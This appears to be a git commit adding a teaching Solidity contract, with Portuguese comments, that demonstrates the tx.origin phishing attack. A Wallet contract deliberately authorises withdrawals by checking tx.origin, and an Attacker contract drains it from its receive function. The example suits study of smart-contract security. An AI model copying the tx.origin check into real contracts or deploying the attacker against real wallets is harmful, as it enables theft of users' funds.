a9fd833f84d4a690f97dc28b768ec03e98a97067
jeff mascarenhas <jeftarmascarenhas@hotmail.com>
2023-12-10 23:22:02 -0300

    feat: adding tx origin attack smart contract

---
+++ contracts/TxOriginAttack.sol
@@ -0,0 +1,46 @@
+// SPDX-License-Identifier: MIT
+pragma solidity 0.8.0;
+
+/**
+* Tx.origin é uma variável global no Solidity que retorna o endereço da conta de propriedade externa (EOA) original 
+* que iniciou a transação. É diferente de msg.sender, que retorna a conta imediata (conta externa ou contratual) 
+* que invocou determinada função.
+*/
+
+/**
+Se houver múltiplas invocações de funções ao longo de diferentes contratos em determinada cadeia de transações, 
+tx.origin sempre se referirá ao EOA que o iniciou, independentemente da pilha de contratos envolvidos, 
+enquanto msg.sender se referirá à última instância (EOA ou smart contrato) a partir do qual cada função nessa 
+cadeia de transações foi chamada.
+
+*/
+
+contract Wallet {
+    address public owner;
+
+    constructor() {
+        owner = msg.sender;
+    }
+
+    receive() external payable{}
+
+    function withdrawFunds(address to) public {
+        require(tx.origin == owner, "Not owner");
+        uint contractBalance = address(this).balance;
+        (bool suceed,) = to.call{value:contractBalance}("");
+        require(suceed, "Failed withdrawal");
+    }
+}
+
+contract Attacker {
+    address public owner;
+    Wallet public victim; 
+    constructor(Wallet _victim) {
+        owner = payable(msg.sender);
+        victim = Wallet(_victim);
+    }
+
+    receive() external payable{
+       victim.withdrawFunds(owner); 
+    }
+}
